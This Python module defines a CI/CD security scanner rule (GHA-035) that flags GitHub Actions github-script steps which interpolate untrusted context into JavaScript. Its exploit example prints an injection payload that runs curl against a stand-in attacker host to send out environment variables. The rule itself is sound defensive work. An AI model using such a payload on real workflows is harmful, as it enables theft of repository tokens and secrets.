"""GHA-035, ``actions/github-script`` interpolates untrusted context into the JS source."""
from __future__ import annotations

from typing import Any

from ...base import Finding, Severity
from ...rule import Rule
from ..base import iter_jobs, iter_steps
from ._helpers import UNTRUSTED_CONTEXT_RE

RULE = Rule(
    id="GHA-035",
    title="github-script step interpolates untrusted context",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-4",),
    esf=("ESF-D-INJECTION",),
    cwe=("CWE-94",),
    recommendation=(
        "Pass attacker-controllable values through ``env:`` and read "
        "them inside the script via ``process.env.X`` instead of "
        "interpolating ``${{ ... }}`` directly into the script body. "
        "GitHub expands the expression *before* the JavaScript engine "
        "parses the source, so backticks, quotes, and ``${...}`` "
        "characters in the source field break out of the surrounding "
        "string and execute as JavaScript with the workflow's "
        "GITHUB_TOKEN in scope."
    ),
    docs_note=(
        "GHA-003 covers ``run:`` blocks where shell expansion is the "
        "injection surface. ``actions/github-script@<ref>`` runs the "
        "``script:`` input as Node.js inside an authenticated Octokit "
        "context, same threat model, different language. The rule "
        "fires when ``script:`` (or the legacy ``previews:`` companion "
        "for inline JS) contains a ``${{ github.event.* }}``, "
        "``${{ inputs.* }}``, ``${{ github.head_ref }}``, "
        "``${{ github.ref_name }}``, or any other untrusted context "
        "expression, exactly the same catalog GHA-003 uses."
    ),
    known_fp=(
        "Scripts that interpolate ``${{ steps.*.outputs.* }}`` from a "
        "trusted upstream step are out of scope (the rule only matches "
        "the curated untrusted-context regex). If you intentionally "
        "rely on a non-curated context, suppress with a brief "
        "``.pipelinecheckignore`` rationale.",
    ),
    exploit_example=(
        "# Vulnerable: a PR title containing\n"
        "#   `;require('child_process').execSync('curl https://attacker.example/-d \"$(env)\"');//\n"
        "# closes the surrounding string, runs Node code against the\n"
        "# workflow's GITHUB_TOKEN, and exfiltrates every env var.\n"
        "jobs:\n"
        "  comment:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/github-script@<sha>\n"
        "        with:\n"
        "          script: |\n"
        "            const title = `${{ github.event.pull_request.title }}`;\n"
        "            await github.rest.issues.createComment({ body: title });\n"
        "\n"
        "# Safe: route the value through env so Node sees it as a\n"
        "# string, never as JavaScript source.\n"
        "jobs:\n"
        "  comment:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/github-script@<sha>\n"
        "        env:\n"
        "          PR_TITLE: ${{ github.event.pull_request.title }}\n"
        "        with:\n"
        "          script: |\n"
        "            await github.rest.issues.createComment({\n"
        "              body: process.env.PR_TITLE,\n"
        "            });"
    ),
)


def _is_github_script_step(step: dict[str, Any]) -> bool:
    """True when ``step.uses`` references ``actions/github-script``.

    Matches both pinned (``actions/github-script@<sha>``) and
    floating (``@v7``) refs since the action is the same regardless
    of how it's pinned. Forks (``my-org/github-script``) aren't
    matched. Those are different actions even if they vendor the
    same shape.
    """
    uses = step.get("uses")
    if not isinstance(uses, str):
        return False
    head = uses.split("@", 1)[0]
    return head == "actions/github-script"


def check(path: str, doc: dict[str, Any]) -> Finding:
    offenders: list[str] = []
    for job_id, job in iter_jobs(doc):
        for idx, step in enumerate(iter_steps(job)):
            if not _is_github_script_step(step):
                continue
            with_block = step.get("with")
            if not isinstance(with_block, dict):
                continue
            script = with_block.get("script")
            if not isinstance(script, str):
                continue
            if UNTRUSTED_CONTEXT_RE.search(script):
                offenders.append(f"{job_id}[{idx}]")
    passed = not offenders
    desc = (
        "No ``actions/github-script`` step interpolates untrusted context."
        if passed else
        f"{len(offenders)} ``actions/github-script`` step(s) "
        f"interpolate attacker-controllable context into the JS "
        f"source: {', '.join(offenders)}. Backticks, quotes, and "
        f"``${{...}}`` in the source field break out of the script "
        f"string and execute against the workflow's GITHUB_TOKEN."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
    )
